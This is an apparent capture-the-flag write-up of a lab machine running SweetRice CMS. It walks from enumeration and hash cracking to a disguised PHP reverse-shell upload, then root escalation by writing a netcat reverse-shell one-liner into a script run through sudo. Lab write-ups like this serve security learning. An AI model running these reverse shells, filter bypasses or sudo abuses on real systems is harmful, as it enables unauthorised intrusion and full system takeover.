## Target IP: `10.10.106.229`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.71.138 -oN results.txt
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 22 | SSH |
| 80 | HTTP |

---

### Web Enumeration

- HTTP server is a default Apache2 page.
- Ran initial directory brute-force:

```bash
gobuster dir -u http://10.10.71.138 -w /usr/share/dirb/wordlists/common.txt
```

- Found: `/content`
- Ran a deeper scan on that directory:

```bash
gobuster dir -u http://10.10.71.138/content -w /usr/share/dirb/wordlists/common.txt
```

- Potential larger wordlist for future reference:

```bash
gobuster dir -u http://10.10.71.138/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Found Directories:**

- `/content/_themes` – empty
- `/content/as` – SweetRice login page
- `/content/attachment` – initially empty
- `/content/images`
- `/content/js`
- `/content/inc` – contains `mysql_backup` folder

---

### Credentials Discovery

- Downloaded file from `/content/inc/mysql_backup`
- Found:

```
admin: manager
42f749ade7f9e195bf475f37a44cafcb
```

- Used CrackStation to identify the hash as **MD5**
- Password: `[REDACTED]`

---

### Web Shell Upload

- Logged into SweetRice at `/content/as` with:

```
Username: admin
Password: [REDACTED]
```

- Found a section to add a post and upload an attachment.
- Used **PHP reverse shell** from Pentestmonkey GitHub.
- Edited reverse shell to point to attacker's IP and port.
- Renamed to `reverse_shell.phtml` to bypass `.php` filters.
- Started a Netcat listener:

```bash
nc -lvnp 8888
```

**Netcat Flags:**

| Flag | Description |
| --- | --- |
| -l | Listen for connection |
| -v | Verbose output |
| -n | Don't resolve DNS |
| -p | Port to listen on |
- Accessed the uploaded file via `/content/attachment/reverse_shell.phtml`
- Got a shell connection.

---

### Shell Stabilization

- Initial shell was unstable. Upgraded it using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

**What This Does:**

- `pty.spawn("/bin/bash")`: Spawns a pseudo-terminal.
- `CTRL+Z`: Suspends current session.
- `stty raw -echo`: Sets terminal mode so input behaves properly.
- `fg`: Brings suspended shell to foreground.
- `export TERM=xterm`: Sets proper terminal type for full shell functionality.

---

### User Flag

- Navigated to `/home/itguy`
- Found and read `user.txt`

---

### Privilege Escalation

- Checked sudo permissions:

```bash
sudo -l
```

**Output:**

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```

- Listed file permissions:

```bash
ls -al
```

- Read the contents of `backup.pl`:

```bash
cat backup.pl
```

**Contents:**

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

- `backup.pl` runs `/etc/copy.sh` using `sh`.

---

### Exploiting Perl Script

- Edited `/etc/copy.sh` with a reverse shell payload:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <HOST_IP> <HOST_LISTENING_PORT> >/tmp/f
```

**Note:** This was only possible because the shell was upgraded/stable. Editing with `nano` or similar wouldn’t work in a basic reverse shell.

- Started a second Netcat listener:

```bash
nc -lvnp 9999
```

- Ran the vulnerable Perl script:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

- Got an error message, but checked listener—shell was successful.

```bash
whoami
```

- Confirmed: `root`
- Navigated to `/root` and read `root.txt`
